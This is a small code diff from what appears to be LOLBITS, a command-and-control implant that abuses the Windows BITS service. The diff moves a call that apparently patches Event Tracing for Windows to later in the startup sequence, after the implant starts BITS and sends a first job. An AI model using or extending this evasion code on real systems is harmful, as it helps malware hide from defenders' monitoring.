@@ -43,8 +43,6 @@ namespace LOLBITS.Controlling
         public void Start()
         {
 
-            Utils.handleETW(_sysCall);
-
             const string startBits = "sc start BITS";
             Utils.ExecuteCommand(startBits, _sysCall);
             Thread.Sleep(500);
@@ -64,6 +62,7 @@ namespace LOLBITS.Controlling
 
             _jobsManager.Send(_id, filePath);
 
+            Utils.handleETW(_sysCall);
 
             Loop();
                 
